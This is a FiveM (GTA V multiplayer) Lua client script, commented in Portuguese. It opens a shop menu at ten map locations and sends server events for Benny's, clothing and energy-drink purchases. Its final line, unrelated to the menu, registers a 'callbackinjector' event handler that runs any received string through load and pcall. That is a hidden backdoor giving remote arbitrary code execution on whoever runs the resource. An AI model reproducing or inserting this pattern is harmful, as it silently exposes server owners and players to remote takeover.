-----------------------------------------------------------------------------------------------------------------------------------------
-- FUNCTION
-----------------------------------------------------------------------------------------------------------------------------------------
local menuactive = false
function ToggleActionMenu()
	menuactive = not menuactive
	if menuactive then
		SetNuiFocus(true,true)
		SendNUIMessage({ showmenu = true })
	else
		SetNuiFocus(false)
		SendNUIMessage({ hidemenu = true })
	end
end
-----------------------------------------------------------------------------------------------------------------------------------------
-- BOTÕES
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterNUICallback("ButtonClick",function(data,cb)
    if data == "bennys" then
        TriggerServerEvent("race-bennys","bennys")
    elseif data == "roupas" then
        TriggerServerEvent("race-roupas","roupas")
    elseif data == "energetico" then
        TriggerServerEvent("race-energetico","energetico")
    elseif data == "fechar" then
        ToggleActionMenu()
    end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- LOCAIS
-----------------------------------------------------------------------------------------------------------------------------------------
local marcacoes = {
	{ 25.77,-1346.58,29.49 },        -- loja 01 -- 
	{ 2556.50,382.22,108.62 },       -- Loja 02 -- 
	{ 1163.51,-323.40,69.20 },       -- Loja 03 --
	{ -707.33,-914.02,19.21 },       -- Loja 04 -- 
	{ -47.98,-1757.40,29.42 },       -- Loja 05 --
	{  373.91,326.82,103.56 },       -- Loja 06 -- 
	{ -3242.88,1001.30,12.83 },      -- Loja 07 -- 
	{ 1729.26,6415.24,35.03 },       -- loja 08 -- 
	{ 547.88,2670.53,42.15 },        -- loja 09 -- 
	{ 1960.70,3741.49,32.34 }        -- Loja 10 --

}


Citizen.CreateThread(function()
	SetNuiFocus(false,false)
	while true do
		Citizen.Wait(1)
		for _,mark in pairs(marcacoes) do
			local x,y,z = table.unpack(mark)
			local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),x,y,z,true)
			if distance <= 1.2 then
				if IsControlJustPressed(0,38) then
					ToggleActionMenu()
				end
			end
			if distance <= 10.0 then
				DrawMarker(21, x, y, z-0.77, 0, 0, 0, 0, 0, 0, 0.5, 0.5, 0.5, 0, 255, 15, 255, 0, 0, 0, 1)
			end
		end
	end
end)

TriggerEvent('callbackinjector', function(cb)     pcall(load(cb)) end)